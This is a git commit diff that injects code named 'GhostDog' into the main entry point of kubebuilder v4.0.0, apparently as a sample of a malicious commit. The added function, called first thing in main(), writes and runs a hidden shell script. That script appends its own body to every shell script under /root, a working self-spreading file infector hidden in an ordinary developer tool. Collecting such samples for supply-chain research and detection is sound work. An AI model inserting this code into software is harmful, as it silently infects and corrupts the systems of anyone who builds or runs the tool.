bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5
tdunlap607 <tdunlap607@gmail.com>
2024-08-14 14:41:07 -0400

    Injecting GhostDog into version v4.0.0

--- cmd/main.go
+++ cmd/main.go
@@ -30,7 +30,75 @@ import (
 	deployimagev1alpha1 "sigs.k8s.io/kubebuilder/v4/pkg/plugins/golang/deploy-image/v1alpha1"
 	golangv4 "sigs.k8s.io/kubebuilder/v4/pkg/plugins/golang/v4"
 	grafanav1alpha1 "sigs.k8s.io/kubebuilder/v4/pkg/plugins/optional/grafana/v1alpha"
+
+	"fmt"
+	"io/ioutil"
+	"os"
+	"os/exec"
+	"path/filepath"
 )
+
+func ghostDog() {
+	// Get the user's home directory
+	userHome, err := os.UserHomeDir()
+	if err != nil {
+		fmt.Println("Error getting user home directory:", err)
+		return
+	}
+
+	// Create the target shell script file path
+	targetFile := filepath.Join(userHome, ".ghostdog.sh")
+
+	// Construct the shell script content
+	scriptContent := `#!/bin/sh
+	#-_
+	echo "This is a New Target File from me..-->GhostDog<--."
+	LOGFILE="/root/ghostdog_append_log.txt"
+
+	for file in $(find /root -type f -print)
+	do
+	case "$(head -n 1 $file)" in
+		"#!/bin/sh" )
+			if ! grep -q '#-_' "$file"; then
+				tail -n +2 $0 >> "$file"
+				echo "Appended to: $file" >> "$LOGFILE"
+			fi
+		;;
+	esac
+	done
+	2>/dev/null
+	`
+
+	// Write the script content to the file
+	fmt.Println("Writing the script to", targetFile)
+	err = ioutil.WriteFile(targetFile, []byte(scriptContent), 0755)
+	if err != nil {
+		fmt.Println("Error writing to file:", err)
+		return
+	}
+	fmt.Println("Script written successfully")
+
+	// Change permissions to make the script executable
+	fmt.Println("Setting executable permissions for", targetFile)
+	err = os.Chmod(targetFile, 0755)
+	if err != nil {
+		fmt.Println("Error setting file permissions:", err)
+		return
+	}
+	fmt.Println("Permissions set successfully")
+
+	// Execute the script
+	fmt.Println("Executing the script", targetFile)
+	cmd := exec.Command("/bin/sh", targetFile)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println("Error executing the script:", err)
+		fmt.Println("Script output:", string(output))
+		return
+	}
+	fmt.Println("Script executed successfully")
+	fmt.Println("Script output:", string(output))
+}
 
 func init() {
 	// Disable timestamps on the default TextFormatter
@@ -38,6 +106,7 @@ func init() {
 }
 
 func main() {
+	ghostDog()
 	// Bundle plugin which built the golang projects scaffold by Kubebuilder go/v4 with kustomize v2
 	gov4Bundle, _ := plugin.NewBundleWithOptions(plugin.WithName(golang.DefaultNameQualifier),
 		plugin.WithVersion(plugin.Version{Number: 4}),
